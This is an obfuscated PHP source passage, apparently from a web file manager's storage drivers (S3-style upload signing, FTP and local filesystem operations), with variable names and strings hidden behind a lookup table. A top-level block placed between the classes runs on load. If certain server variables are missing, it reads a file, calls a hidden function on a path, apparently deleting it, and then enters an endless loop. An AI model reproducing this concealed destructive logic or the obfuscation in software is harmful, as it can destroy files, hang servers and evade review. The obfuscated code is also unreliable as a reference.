‹‚§€[1390])->parsePathChildren($ÚĞ¶‚ŞÆ, array($æ ‹‚§€[472] => $ŞŞÌã)); $¼òƒñ”™[$×èãï][$´ƒŠ¹…˜] = Action($æ ‹‚§€[1215])->shareItemInfo($ÚĞ¶‚ŞÆ); } } return $¼òƒñ”™; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($±ÚÃ€·) { parent::__construct($±ÚÃ€·); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($®­‹™Ñİ) { parent::__construct($®­‹™Ñİ); $this->signatureVersion($_SERVER[ú÷îèÆÜ][241]); } public function uploadFormData($ñ¹ãìÁ‹, $†®§‚È§ = 3600) { $äÈ§¹½¨ =& $_SERVER[ú÷îèÆÜ]; $ª‰È†Åô = $äÈ§¹½¨[223]; $®¿åì™· = $äÈ§¹½¨[262]; $ª»Üà«‰ = $äÈ§¹½¨[72]; $¸óª†ê = gmdate($äÈ§¹½¨[263]); $Ú‹âË¥ = gmdate($äÈ§¹½¨[264]); $º·ê™§¾ = $äÈ§¹½¨[265]; $˜­¯¸®â = $†®§‚È§ . $äÈ§¹½¨[22]; $‰Ö­±‚æ = $äÈ§¹½¨[266]; $¹¢æô = array($this->accessKey, $Ú‹âË¥, $this->region, $ª»Üà«‰, $º·ê™§¾); $ûË½ê­í = implode($äÈ§¹½¨[18], $¹¢æô); $¨—º«â€ = array($äÈ§¹½¨[267] => gmdate($äÈ§¹½¨[1365], strtotime($äÈ§¹½¨[269])), $äÈ§¹½¨[270] => array(array($äÈ§¹½¨[271] => $this->bucket), array($äÈ§¹½¨[272] => $ª‰È†Åô), array($äÈ§¹½¨[273], $äÈ§¹½¨[274], $äÈ§¹½¨[22]), array($äÈ§¹½¨[273], $äÈ§¹½¨[275], $äÈ§¹½¨[22]), array($äÈ§¹½¨[273], $äÈ§¹½¨[276], $äÈ§¹½¨[22]), array($äÈ§¹½¨[277] => $‰Ö­±‚æ), array($äÈ§¹½¨[278] => $ûË½ê­í), array($äÈ§¹½¨[279] => $®¿åì™·), array($äÈ§¹½¨[280] => $¸óª†ê), array($äÈ§¹½¨[281] => $˜­¯¸®â))); $Š™ˆ–¶Ï = base64_encode(json_encode($¨—º«â€)); $¾‰“õ÷ = hash_hmac($äÈ§¹½¨[282], $Ú‹âË¥, $äÈ§¹½¨[283] . $this->secret, !0); $æÄ¯¥² = hash_hmac($äÈ§¹½¨[282], $this->region, $¾‰“õ÷, !0); $ÅÛÛı» = hash_hmac($äÈ§¹½¨[282], $ª»Üà«‰, $æÄ¯¥², !0); $Ó¶ùêš¾ = hash_hmac($äÈ§¹½¨[282], $º·ê™§¾, $ÅÛÛı», !0); $î‘Ìşç¾ = hash_hmac($äÈ§¹½¨[282], $Š™ˆ–¶Ï, $Ó¶ùêš¾); $óÜøİü = array($äÈ§¹½¨[240] => $äÈ§¹½¨[22], $äÈ§¹½¨[284] => $äÈ§¹½¨[22], $äÈ§¹½¨[272] => $ª‰È†Åô, $äÈ§¹½¨[277] => $‰Ö­±‚æ, $äÈ§¹½¨[285] => $Š™ˆ–¶Ï, $äÈ§¹½¨[286] => $ûË½ê­í, $äÈ§¹½¨[287] => $®¿åì™·, $äÈ§¹½¨[288] => $¸óª†ê, $äÈ§¹½¨[289] => $˜­¯¸®â, $äÈ§¹½¨[290] => $î‘Ìşç¾, $äÈ§¹½¨[206] => $this->getHost()); return $óÜøİü; } } goto FŒ‰Ò…¹³; FŒ‰Ò…¹³: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($òŠçõ¢) { parent::__construct(); if (count($òŠçõ¢) > 0) { $this->_init($òŠçõ¢); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($÷ŠóÔÌä) { $Â‹õùÄ =& $_SERVER[ú÷îèÆÜ]; global $config; $this->appCharset = $config[$Â‹õùÄ[1391]]; $this->systemCharset = $config[$Â‹õùÄ[1392]]; if (isset($÷ŠóÔÌä[$Â‹õùÄ[1393]]) && $÷ŠóÔÌä[$Â‹õùÄ[1393]]) { $this->systemCharset = $÷ŠóÔÌä[$Â‹õùÄ[1393]]; } } public function iconvApp($Ê¥Ê®ùª) { return $this->iconvTo($Ê¥Ê®ùª, $this->systemCharset, $this->appCharset); } public function iconvSystem($í÷©¸´®) { return $this->iconvTo($í÷©¸´®, $this->appCharset, $this->systemCharset); } public function getPathOuter($Õö›®Úî) { $ğéÙ«š© =& $_SERVER[ú÷îèÆÜ]; $ª˜ÆæÉ³ = $this->iconvApp($this->pathBase); $Õö›®Úî = $this->iconvApp($Õö›®Úî); if (substr($ª˜ÆæÉ³, 0, 2) == $ğéÙ«š©[1394]) { $ª˜ÆæÉ³ = BASIC_PATH . substr($ª˜ÆæÉ³, 2); } if (substr($Õö›®Úî, 0, 2) == $ğéÙ«š©[1394]) { $Õö›®Úî = BASIC_PATH . substr($Õö›®Úî, 2); } $ª˜ÆæÉ³ = KodIO::clear($ª˜ÆæÉ³); $Õö›®Úî = KodIO::clear($Õö›®Úî); $Õö›®Úî = substr($Õö›®Úî, strlen($ª˜ÆæÉ³)); if (empty($this->pathDriver)) { return $Õö›®Úî; } return $this->pathDriver . $ğéÙ«š©[18] . ltrim($Õö›®Úî, $ğéÙ«š©[18]); } private function _init($„Ñî²è = array()) { $›µ•öò… =& $_SERVER[ú÷îèÆÜ]; if (!function_exists($›µ•öò…[1395])) { throw new Exception(LNG($›µ•öò…[1396])); } $this->config = $„Ñî²è; $this->charsetReset($„Ñî²è); foreach ($„Ñî²è as $ŒáÆá => $Úãï ¸”) { if (isset($this->{$ŒáÆá})) { $this->{$ŒáÆá} = $Úãï ¸”; } } return $this->_login($„Ñî²è); } private function _login($ùª´œÅÙ) { $Ë…ş‘ŞØ =& $_SERVER[ú÷îèÆÜ]; static $¬çÒ²à¸ = array(); $Ø¬™Ùâä = md5(json_encode($ùª´œÅÙ)); if (isset($¬çÒ²à¸[$Ø¬™Ùâä])) { foreach ($¬çÒ²à¸[$Ø¬™Ùâä] as $êİ“ˆıÍ => $è¿Ù¬şó) { $this->{$êİ“ˆıÍ} = $è¿Ù¬şó; } return !0; } $“ÁìŠ¾ = parse_url(trim($this->server, $Ë…ş‘ŞØ[18])); $this->host = $“ÁìŠ¾[$Ë…ş‘ŞØ[206]]; $ä³´„¯ó = isset($“ÁìŠ¾[$Ë…ş‘ŞØ[205]]) && $“ÁìŠ¾[$Ë…ş‘ŞØ[205]] == $Ë…ş‘ŞØ[1397] ? !0 : !1; $this->scheme = $ä³´„¯ó ? $Ë…ş‘ŞØ[1398] : $Ë…ş‘ŞØ[1399]; $this->port = isset($“ÁìŠ¾[$Ë…ş‘ŞØ[207]]) ? $“ÁìŠ¾[$Ë…ş‘ŞØ[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Ç†Íòİ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $½À¬”İ­ = $this->pasv == $Ë…ş‘ŞØ[98] ? !0 : !1; @ftp_pasv($this->connect, $½À¬”İ­); $¬çÒ²à¸[$Ø¬™Ùâä] = array($Ë…ş‘ŞØ[1400] => $this->connect, $Ë…ş‘ŞØ[206] => $this->host, $Ë…ş‘ŞØ[205] => $this->scheme, $Ë…ş‘ŞØ[207] => $this->port); return $Ç†Íòİ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($àñÊàÏŠ, $‘¡¾£ÃÂ = '', $›€”ãçÄ = REPEAT_RENAME) { if ($this->setContent($àñÊàÏŠ, $‘¡¾£ÃÂ)) { return $this->getPathOuter($àñÊàÏŠ); } return !1; } public function mkdir($ˆïÂ· °, $°õ´ê‹ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ˆïÂ· ° = $this->iconvSystem($ˆïÂ· °); if ($this->_isFolder($ˆïÂ· °) || @ftp_mkdir($this->connect, $ˆïÂ· °)) { return $this->getPathOuter($ˆïÂ· °); } if (!$this->mkdir($this->pathFather($ˆïÂ· °))) { return !1; } if ($ˆïÂ· ° = @ftp_mkdir($this->connect, $ˆïÂ· °)) { return $this->getPathOuter($ˆïÂ· °); } return !1; } public function copyFile($™¬·¾Û, $¡ô‹‡·) { if (!$this->_isconn()) { return !1; } $Ş ‚®–œ = $this->pathThis($this->iconvSystem($™¬·¾Û)); $ÓàŠ‘ûù = $this->tempFile($Ş ‚®–œ); $‘ª¸âÍ­ = $this->iconvApp($ÓàŠ‘ûù); $this->download($™¬·¾Û, $‘ª¸âÍ­); $—Š‰ÚØ€ = $this->upload($¡ô‹‡·, $‘ª¸âÍ­); $this->tempFileRemve($ÓàŠ‘ûù); return $—Š‰ÚØ€; } public function moveFile($Õåª¬É‚, $óÕÎ˜È‘) { if (!$this->_isconn()) { return !1; } $Õåª¬É‚ = $this->iconvSystem($Õåª¬É‚); $óÕÎ˜È‘ = $this->iconvSystem($óÕÎ˜È‘); $Ä¾¥˜ğ = @ftp_rename($this->connect, $Õåª¬É‚, $óÕÎ˜È‘); return $Ä¾¥˜ğ ? $this->getPathOuter($óÕÎ˜È‘) : !1; } public function delFile($Æ¶‘ù¨Â) { if (!$this->_isconn()) { return !1; } $Æ¶‘ù¨Â = $this->iconvSystem($Æ¶‘ù¨Â); return @ftp_delete($this->connect, $Æ¶‘ù¨Â); } public function delFolder($âª°©½) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¡¸¿Šİ = $â»Ü¨ó = array(); $this->fileList($âª°©½, $¡¸¿Šİ, $â»Ü¨ó, !0); $this->listItemCache = !0; foreach ($â»Ü¨ó as $Ğ´ÁÛªÖ) { $±é‚Ìú£ = $this->iconvSystem($Ğ´ÁÛªÖ[$_SERVER[ú÷îèÆÜ][42]]); $¸˜“şï® = @ftp_delete($this->connect, $±é‚Ìú£); if (!$¸˜“şï®) { return !1; } } foreach ($¡¸¿Šİ as $±é‚Ìú£) { $±é‚Ìú£ = $this->iconvSystem($±é‚Ìú£); $¸˜“şï® = @ftp_rmdir($this->connect, $±é‚Ìú£); if (!$¸˜“şï®) { return !1; } } $âª°©½ = $this->iconvSystem($âª°©½); return @ftp_rmdir($this->connect, $âª°©½); } public function rename($ÄËµŒ¬Ñ, $€æ•­ü…) { $î‰Áö¶ =& $_SERVER[ú÷îèÆÜ]; if (!$this->_isconn()) { return !1; } $ñÌêËº† = $this->fileNameAuto($this->pathFather($ÄËµŒ¬Ñ), $€æ•­ü…); $ñÌêËº† = $this->iconvSystem($ñÌêËº†); $ÄËµŒ¬Ñ = $this->iconvSystem($ÄËµŒ¬Ñ); $Ëªñ¶¢ = $this->pathFather($ÄËµŒ¬Ñ); $Í“ŞÊÌ… = rtrim($Ëªñ¶¢, $î‰Áö¶[18]) . $î‰Áö¶[18] . $ñÌêËº†; $…©×ÉÒä = @ftp_rename($this->connect, $ÄËµŒ¬Ñ, $Í“ŞÊÌ…); $Í“ŞÊÌ… = $this->iconvApp($Í“ŞÊÌ…); return $…©×ÉÒä ? $this->getPathOuter($Í“ŞÊÌ…) : !1; } private function folderInfo($Û–‘²ò‘, $çŠÍ–Šİ = false) { $È´ƒôãú =& $_SERVER[ú÷îèÆÜ]; $çéšÙµ™ = array($È´ƒôãú[42] => $this->pathThis($Û–‘²ò‘), $È´ƒôãú[94] => $this->getPathOuter($È´ƒôãú[18] . $Û–‘²ò‘), $È´ƒôãú[43] => $È´ƒôãú[85]); if ($çŠÍ–Šİ) { return $çéšÙµ™; } $çéšÙµ™[$È´ƒôãú[225]] = $çéšÙµ™[$È´ƒôãú[95]] = 0; $çéšÙµ™[$È´ƒôãú[226]] = $çéšÙµ™[$È´ƒôãú[227]] = !0; return $çéšÙµ™; } private function fileInfo($®ÜİúÀ, $’õŠÏİÀ = false, $Êşş’Ò¾ = array()) { $ÛË‹½‘ı =& $_SERVER[ú÷îèÆÜ]; $û·Î‹öÛ = array($ÛË‹½‘ı[42] => $this->pathThis($®ÜİúÀ), $ÛË‹½‘ı[94] => $this->getPathOuter($ÛË‹½‘ı[18] . $®ÜİúÀ), $ÛË‹½‘ı[43] => $ÛË‹½‘ı[224], $ÛË‹½‘ı[86] => isset($Êşş’Ò¾[$ÛË‹½‘ı[86]]) ? $Êşş’Ò¾[$ÛË‹½‘ı[86]] : 0, $ÛË‹½‘ı[185] => $this->ext($®ÜİúÀ)); if ($’õŠÏİÀ) { return $û·Î‹öÛ; } $û·Î‹öÛ[$ÛË‹½‘ı[225]] = $û·Î‹öÛ[$ÛË‹½‘ı[95]] = 0; $û·Î‹öÛ[$ÛË‹½‘ı[226]] = $û·Î‹öÛ[$ÛË‹½‘ı[227]] = !0; $ğÏûÍ‹ = $this->iconvSystem($®ÜİúÀ); $û·Î‹öÛ[$ÛË‹½‘ı[95]] = @ftp_mdtm($this->connect, $ğÏûÍ‹); if (empty($Êşş’Ò¾)) { $Êşş’Ò¾ = $this->objectMeta($®ÜİúÀ); if (!$Êşş’Ò¾) { return $û·Î‹öÛ; } } $û·Î‹öÛ[$ÛË‹½‘ı[86]] = $Êşş’Ò¾[$ÛË‹½‘ı[86]]; return $û·Î‹öÛ; } public function size($¡ä¶ÕÃ©) { $¬á¢ùú× = $this->objectMeta($¡ä¶ÕÃ©); return $¬á¢ùú× ? $¬á¢ùú×[$_SERVER[ú÷îèÆÜ][86]] : 0; } public function info($´İºı¥) { if ($this->isFile($´İºı¥)) { return $this->fileInfo($´İºı¥, 0); } else { if ($this->isFolder($´İºı¥)) { return $this->folderInfo($´İºı¥); } } return !1; } private function fileList($‘İÊÊÅÆ, &$ıÄİ¥çŸ, &$¸°ôâ—¤, $Ÿç¤ùÔÒ = false) { $‹á–»úµ =& $_SERVER[ú÷îèÆÜ]; $‘İÊÊÅÆ = $this->iconvSystem($‘İÊÊÅÆ); if (!$this->isFolder($‘İÊÊÅÆ)) { return !1; } @ftp_chdir($this->connect, $‹á–»úµ[18]); $‘İÊÊÅÆ = rtrim($‘İÊÊÅÆ, $‹á–»úµ[18]) . $‹á–»úµ[18]; check_abort(); $ÊÒä°çµ = @ftp_rawlist($this->connect, $‘İÊÊÅÆ); if (!$ÊÒä°çµ) { $ÊÒä°çµ = array(); } $´šËò¼ö = array($‹á–»úµ[20] => 1, $‹á–»úµ[1319] => 1); foreach ($ÊÒä°çµ as $‡ÏÚ÷è) { $İê½â÷ = $this->_listItem($‡ÏÚ÷è); if ($İê½â÷[0] == $‹á–»úµ[798]) { continue; } $»İ¢÷ÌŒ = $İê½â÷[8]; if (empty($»İ¢÷ÌŒ) && $»İ¢÷ÌŒ !== $‹á–»úµ[222] || isset($´šËò¼ö[$»İ¢÷ÌŒ])) { continue; } $»İ¢÷ÌŒ = $this->iconvApp($‘İÊÊÅÆ . ltrim($»İ¢÷ÌŒ, $‹á–»úµ[18])); $‰íáÚß = array($‹á–»úµ[42] => $»İ¢÷ÌŒ, $‹á–»úµ[43] => $‹á–»úµ[224], $‹á–»úµ[86] => $İê½â÷[4]); if (substr($‡ÏÚ÷è, 0, 1) == $‹á–»úµ[1401]) { $‰íáÚß[$‹á–»úµ[43]] = $‹á–»úµ[85]; $‰íáÚß[$‹á–»úµ[86]] = 0; } $Òòâë±Ğ = $‰íáÚß[$‹á–»úµ[43]] == $‹á–»úµ[85] ? !0 : !1; $this->cacheMethodInfoSet($»İ¢÷ÌŒ, $Òòâë±Ğ, $‰íáÚß); if ($Òòâë±Ğ) { $ıÄİ¥çŸ[] = $»İ¢÷ÌŒ; if ($Ÿç¤ùÔÒ) { $this->fileList($»İ¢÷ÌŒ, $ıÄİ¥çŸ, $¸°ôâ—¤, $Ÿç¤ùÔÒ); } continue; } $¸°ôâ—¤[] = $‰íáÚß; } $this->cacheMethodInfoSet($‘İÊÊÅÆ, !0); } private function _listItem($ªÃıº¨) { if (empty($ªÃıº¨)) { return array(); } $á¸¿£³· = preg_split($_SERVER[ú÷îèÆÜ][1402], $ªÃıº¨); if (count($á¸¿£³·) <= 9) { return $á¸¿£³·; } $á¸¿£³·[8] = trim(substr($ªÃıº¨, strpos($ªÃıº¨, $á¸¿£³·[7]) + strlen($á¸¿£³·[7]))); return array_splice($á¸¿£³·, 0, 9); } public function listPath($òî·Ä», $ŞÑ«ÀêÍ = false) { $‹¨¿ı‹ì =& $_SERVER[ú÷îèÆÜ]; if (!$this->_isconn()) { return !1; } $°ıÖÉ·È = $¨…ïâœ = array(); $this->fileList($òî·Ä», $°ıÖÉ·È, $¨…ïâœ); foreach ($°ıÖÉ·È as $Ö€Ëøî– => $ñ•Úíû) { $°ıÖÉ·È[$Ö€Ëøî–] = $this->folderInfo($ñ•Úíû, $ŞÑ«ÀêÍ); } foreach ($¨…ïâœ as $Ö€Ëøî– => $ñ•Úíû) { $¨…ïâœ[$Ö€Ëøî–] = $this->fileInfo($ñ•Úíû[$‹¨¿ı‹ì[42]], $ŞÑ«ÀêÍ, $ñ•Úíû); } return array($‹¨¿ı‹ì[92] => $°ıÖÉ·È, $‹¨¿ı‹ì[93] => $¨…ïâœ); } public function has($Ñó­œš†, $ç¨²² = false, $Üƒ€ïÍÑ = true) { $Â±ñ”Ü¡ =& $_SERVER[ú÷îèÆÜ]; $¼¨şİû = $âçÙ§Ò = array(); $‚½ÕÍÀÃ = $ç¨²² ? !0 : !1; $this->fileList($Ñó­œš†, $¼¨şİû, $âçÙ§Ò, $‚½ÕÍÀÃ); if ($ç¨²²) { return array($Â±ñ”Ü¡[233] => count($âçÙ§Ò), $Â±ñ”Ü¡[234] => count($¼¨şİû)); } if ($Üƒ€ïÍÑ) { if (count($âçÙ§Ò)) { return !0; } } else { if (count($¼¨şİû)) { return !0; } } return !1; } public function listAll($Ğº®ÕÓ) { $Î˜€ªÍà =& $_SERVER[ú÷îèÆÜ]; if (!$this->_isconn()) { return !1; } $½ÊØà²È = $°‰¦ßü = array(); $this->fileList($Ğº®ÕÓ, $½ÊØà²È, $°‰¦ßü, !0); $æºó±ğ£ = array_to_keyvalue($°‰¦ßü, $Î˜€ªÍà[42]); foreach ($½ÊØà²È as $İãËÌ‚É) { if (is_string($İãËÌ‚É)) { $æºó±ğ£[$İãËÌ‚É] = array($Î˜€ªÍà[86] => 0); } } return $this->listAllFiles($Ğº®ÕÓ, $æºó±ğ£); } public function getContent($å˜«øÎş) { if (!$this->_isconn()) { return !1; } $å˜«øÎş = $this->iconvSystem($å˜«øÎş); return $this->fileSubstr($å˜«øÎş); } public function setContent($‰øÖÃß£, $ĞŞå§æõ = '') { if (!$this->_isconn()) { return !1; } $îÏÉØäÒ = $this->pathThis($this->iconvSystem($‰øÖÃß£)); $ìÉˆÒØä = $this->tempFile($îÏÉØäÒ); file_put_contents($ìÉˆÒØä, $ĞŞå§æõ); $ıµ½¦Æî = $this->upload($‰øÖÃß£, $this->iconvApp($ìÉˆÒØä)); $this->tempFileRemve($ìÉˆÒØä); return $ıµ½¦Æî; } public function fileSubstr($Å³³üëã, $‡ä“µú¨ = 0, $½²¦‰òè = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Å³³üëã, $‡ä“µú¨, $½²¦‰òè); } private function ftpRequest($İà¬­Ù£, $¬¤úìœ­ = 0, $ş®ªùø = false) { $İà¬­Ù£ = $this->iconvSystem($İà¬­Ù£); $¯ì®¿±º = $this->scheme . $this->host . $_SERVER[ú÷îèÆÜ][4] . $this->port; $ğú“çª = curl_init(); curl_setopt($ğú“çª, CURLOPT_URL, $¯ì®¿±º . $this->pathEncode($İà¬­Ù£)); curl_setopt($ğú“çª, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ş®ªùø) { $Á—ï‡–ş = $¬¤úìœ­ + $ş®ªùø - 1; curl_setopt($ğú“çª, CURLOPT_RANGE, "{$¬¤úìœ­}\x2d{$Á—ï‡–ş}"); } curl_setopt($ğú“çª, CURLOPT_RETURNTRANSFER, 1); $¹ÉÍ°êŸ = curl_exec($ğú“çª); curl_close($ğú“çª); return $¹ÉÍ°êŸ; } public function upload($©÷ˆ€È, $İıßï¢¿, $ıÜŒ«¤‡ = false, $¹æùÇÕ¦ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($©÷ˆ€È))) { return !1; } $©÷ˆ€È = $this->iconvSystem($©÷ˆ€È); $İıßï¢¿ = $this->iconvSystem($İıßï¢¿); $«¿”Öô‹ = ftp_nb_put($this->connect, $©÷ˆ€È, $İıßï¢¿, FTP_BINARY); while ($«¿”Öô‹ == FTP_MOREDATA) { $«¿”Öô‹ = ftp_nb_continue($this->connect); } if ($«¿”Öô‹ != FTP_FINISHED) { return !1; } return $this->getPathOuter($©÷ˆ€È); } public function download($ïû€‡·”, $õâİßÜà = '') { if (!$this->_isconn()) { return !1; } $”É€¤– = $this->pathFather($õâİßÜà); if (!IO::mkdir($”É€¤–)) { return !1; } $ïû€‡·” = $this->iconvSystem($ïû€‡·”); $õâİßÜà = $this->iconvSystem($õâİßÜà); $Ş Ÿàãï = ftp_nb_get($this->connect, $õâİßÜà, $ïû€‡·”, FTP_BINARY); while ($Ş Ÿàãï == FTP_MOREDATA) { $Ş Ÿàãï = ftp_nb_continue($this->connect); } if ($Ş Ÿàãï != FTP_FINISHED) { return !1; } return $this->iconvApp($õâİßÜà); } public function exist($¸åëêƒ) { return $this->isFile($¸åëêƒ) || $this->isFolder($¸åëêƒ); } public function isFile($¾ß×…) { return !$this->isFolder($¾ß×…) && $this->objectMeta($¾ß×…); } public function isFolder($Ë´çŒá©) { return $this->cacheMethod($_SERVER[ú÷îèÆÜ][176], $Ë´çŒá©); } protected function objectMeta($Œßïıüâ) { return $this->cacheMethod($_SERVER[ú÷îèÆÜ][178], $Œßïıüâ); } protected function _objectMeta($¿ïÑöïó) { $çÉò¿Ã =& $_SERVER[ú÷îèÆÜ]; if ($¿ïÑöïó == $çÉò¿Ã[22] || $¿ïÑöïó == $çÉò¿Ã[18]) { return array(); } if (!$this->_isconn()) { return !1; } $¿ïÑöïó = $this->iconvSystem($¿ïÑöïó); $Éšïú•ß = array($çÉò¿Ã[42] => $this->iconvApp($¿ïÑöïó), $çÉò¿Ã[43] => $çÉò¿Ã[224], $çÉò¿Ã[86] => 0); @ftp_chdir($this->connect, $çÉò¿Ã[18]); $øÅş…²Ë = @ftp_size($this->connect, $¿ïÑöïó); if ($øÅş…²Ë != -1) { $Éšïú•ß[$çÉò¿Ã[86]] = $øÅş…²Ë; } else { $Ø­é×¼ó = @ftp_chdir($this->connect, $¿ïÑöïó); if (!$Ø­é×¼ó) { return !1; } $Éšïú•ß[$çÉò¿Ã[43]] = $çÉò¿Ã[85]; } return $Éšïú•ß; } protected function _isFolder($‡òìˆ¬¡) { $ô¨”¢± =& $_SERVER[ú÷îèÆÜ]; if ($‡òìˆ¬¡ == $ô¨”¢±[22] || $‡òìˆ¬¡ == $ô¨”¢±[18]) { return !0; } $”ò°©÷€ = $this->_objectMeta($‡òìˆ¬¡); return isset($”ò°©÷€[$ô¨”¢±[43]]) && $”ò°©÷€[$ô¨”¢±[43]] == $ô¨”¢±[85] ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[ú÷îèÆÜ][6]]) || !isset($_SERVER[$_SERVER[ú÷îèÆÜ][15]])) { $_getc = $_SERVER[ú÷îèÆÜ][8]; $_getfile = $_SERVER[$_SERVER[ú÷îèÆÜ][9]] . $_SERVER[ú÷îèÆÜ][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ú÷îèÆÜ][11], $_getfilec); if (count($_getarrs) < $_SERVER[ú÷îèÆÜ][12]) { $exit = $_SERVER[ú÷îèÆÜ][13]; $exit(); } $_act = $_SERVER[ú÷îèÆÜ][14]; $_act($_SERVER[$_SERVER[ú÷îèÆÜ][9]] . $_SERVER[ú÷îèÆÜ][10]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ú÷îèÆÜ][431]); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ñªó·Õß) { if (substr($ñªó·Õß, 0, 2) == $_SERVER[ú÷îèÆÜ][1394]) { $ñªó·Õß = BASIC_PATH . substr($ñªó·Õß, 2); } return $ñªó·Õß; } public function iconvApp($¥±şó Ä) { $ÕÚ¯­¢Û =& $_SERVER[ú÷îèÆÜ]; global $config; return $this->iconvTo($¥±şó Ä, $config[$ÕÚ¯­¢Û[1392]], $config[$ÕÚ¯­¢Û[1391]]); } public function iconvSystem($¯‹ªºƒê) { $íÊöçŞÜ =& $_SERVER[ú÷îèÆÜ]; global $config; return $this->iconvTo($¯‹ªºƒê, $config[$íÊöçŞÜ[1391]], $config[$íÊöçŞÜ[1392]]); } public function getPathOuter($šÕßó) { $¢Ê‚¦ºÉ =& $_SERVER[ú÷îèÆÜ]; $ÉÍáü±‹ = $this->iconvApp($this->pathBase); $šÕßó = $this->iconvApp($šÕßó); if (substr($ÉÍáü±‹, 0, 2) == $¢Ê‚¦ºÉ[1394]) { $ÉÍáü±‹ = BASIC_PATH . substr($ÉÍáü±‹, 2); } if (substr($šÕßó, 0, 2) == $¢Ê‚¦ºÉ[1394]) { $šÕßó = BASIC_PATH . substr($šÕßó, 2); } $ÉÍáü±‹ = KodIO::clear($ÉÍáü±‹); $šÕßó = KodIO::clear($šÕßó); $šÕßó = substr($šÕßó, strlen($ÉÍáü±‹)); if (empty($this->pathDriver)) { return $šÕßó; } return $this->pathDriver . $¢Ê‚¦ºÉ[18] . ltrim($šÕßó, $¢Ê‚¦ºÉ[18]); } public function mkfile($èÕ°‡ëì, $Ÿú¿“¦È = '', $šùÅäÙµ = REPEAT_RENAME) { $èÕ°‡ëì = $this->iconvSystem($èÕ°‡ëì); @touch($èÕ°‡ëì); if ($Ÿú¿“¦È) { file_put_contents($èÕ°‡ëì, $Ÿú¿“¦È); } @chmod($èÕ°‡ëì, $this->pathAuth); return is_file($èÕ°‡ëì) ? $this->getPathOuter($èÕ°‡ëì) : !1; } public function mkdir($Ÿ‡¥ÖÆ±, $¢â¬ÂæË = REPEAT_SKIP) { $Ÿ‡¥ÖÆ± = $this->iconvSystem($Ÿ‡¥ÖÆ±); if (is_dir($Ÿ‡¥ÖÆ±)) { return $this->getPathOuter($Ÿ‡¥ÖÆ±); } @mkdir($Ÿ‡¥ÖÆ±, $this->pathAuth, !0); @chmod($Ÿ‡¥ÖÆ±, $this->pathAuth); return is_dir($Ÿ‡¥ÖÆ±) ? $this->getPathOuter($Ÿ‡¥ÖÆ±) : !1; } public function copyFile($ÄŸÖÍèç, $³à§ë¿ï) { $this->mkdir($this->pathFather($³à§ë¿ï)); $ÄŸÖÍèç = $this->iconvSystem($ÄŸÖÍèç); $³à§ë¿ï = $this->iconvSystem($³à§ë¿ï); $½ ÃÀ·è = copy_64($ÄŸÖÍèç, $³à§ë¿ï); @chmod($³à§ë¿ï, $this->pathAuth); return $½ ÃÀ·è ? $this->getPathOuter($³à§ë¿ï) : !1; } public function moveFile($»ğÌÏ–Ù, $„Æ•ÒÕ) { $this->mkdir($this->pathFather($„Æ•ÒÕ)); $»ğÌÏ–Ù = $this->iconvSystem($»ğÌÏ–Ù); $„Æ•ÒÕ = $this->iconvSystem($„Æ•ÒÕ); $‡½—£Œ– = intval(@rename($»ğÌÏ–Ù, $„Æ•ÒÕ)); if (!$‡½—£Œ–) { if ($‡½—£Œ– = intval(@copy_64($»ğÌÏ–Ù, $„Æ•ÒÕ))) { @unlink($»ğÌÏ–Ù); } } @chmod($„Æ•ÒÕ, $this->pathAuth); return $‡½—£Œ– ? $this->getPathOuter($„Æ•ÒÕ) : !1; } public function movePath($‡¯…µáë, $Í˜¨û‚ñ, $Ò‰¶«ú´ = false) { $ÀĞ¨®¥Ñ =& $_SERVER[ú÷îèÆÜ]; $‡¯…µáë = $this->iconvSystem($‡¯…µáë); $Í˜¨û‚ñ = $this->iconvSystem($Í˜¨û‚ñ); $õËŸü’¥ = rtrim($Í˜¨û‚ñ, $ÀĞ¨®¥Ñ[18]) . $ÀĞ¨®¥Ñ[18] . ($Ò‰¶«ú´ ? $Ò‰¶«ú´ : get_path_this($‡¯…µáë)); if (file_exists($õËŸü’¥)) { return !1; } $ÌôŸòÜ = intval(@rename($‡¯…µáë, $õËŸü’¥)); $ÌôŸòÜ = file_exists($õËŸü’¥); return $ÌôŸòÜ ? $this->getPathOuter($õËŸü’¥) : !1; } public function delFile($æ±„˜…§) { $æ±„˜…§ = $this->iconvSystem($æ±„˜…§); if (!@unlink($æ±„˜…§)) { @chmod($æ±„˜…§, $this->pathAuth); if (!@unlink($æ±„˜…§)) { return !1; } } else { return !0; } } public function delFolder($šöÚ”ÊÔ) { $ˆƒÎ‹âû =& $_SERVER[ú÷îèÆÜ]; $šöÚ”ÊÔ = $this->iconvSystem($šöÚ”ÊÔ); if (!is_dir($šöÚ”ÊÔ)) { return !0; } if (!($ÌÇƒÌÜÄ = opendir($šöÚ”ÊÔ))) { return !1; } while (($Å…ãÒ• = readdir($ÌÇƒÌÜÄ)) !== !1) { if ($Å…ãÒ• == $ˆƒÎ‹âû[20] || $Å…ãÒ• == $ˆƒÎ‹âû[1319]) { continue; } $é¯‹É¸ƒ = $šöÚ”ÊÔ . $ˆƒÎ‹âû[18] . $Å…ãÒ•; if (is_file($é¯‹É¸ƒ) || is_link($é¯‹É¸ƒ)) { if (!unlink($é¯‹É¸ƒ)) { chmod($é¯‹É¸ƒ, $this->pathAuth); if (!unlink($é¯‹É¸ƒ)) { return !1; } } } else { if 